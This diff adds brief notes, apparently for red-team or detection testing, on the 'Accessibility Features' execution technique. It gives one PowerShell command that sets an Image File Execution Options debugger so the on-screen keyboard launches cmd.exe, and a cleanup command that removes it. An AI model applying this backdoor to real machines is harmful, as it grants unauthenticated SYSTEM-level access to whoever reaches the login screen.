@@ -1,0 +1,15 @@
+
+Event Triggered Execution: Accessibility Features
+
+
+POWERSHELL!!!!!!!!!!!!!!
+----------------------------------------------------------
+
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -Value "cmd.exe" -PropertyType STRING -Force
+
+----------------------------------------------------------
+
+CLEAN UP
+Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -ErrorAction SilentlyContinue
+
+
